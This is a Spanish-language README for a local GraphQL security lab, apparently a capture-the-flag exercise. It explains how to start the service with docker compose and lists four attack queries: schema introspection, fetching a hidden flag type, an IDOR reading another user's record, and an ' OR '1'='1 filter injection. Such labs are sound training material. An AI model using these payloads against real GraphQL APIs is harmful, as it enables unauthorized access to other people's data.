# Lab graphql-injection

Room: **graphql-security** (NUEVA, Tier 3). Introspection, IDOR, filter injection.

## Uso
```bash
cp flags.env.example flags.env
docker compose --env-file flags.env up -d
# POST queries a http://127.0.0.1:18109/graphql
```

| Ataque | Query |
|---|---|
| Introspection | `{ __schema { types { name fields hint } } }` |
| Tipo oculto | `{ secretFlag { value } }` (revelado por introspection) |
| IDOR | `{ user(id:1) { email note } }` siendo alice (id=2) |
| Filter injection | `{ search(q:"' OR '1'='1") { title class } }` |
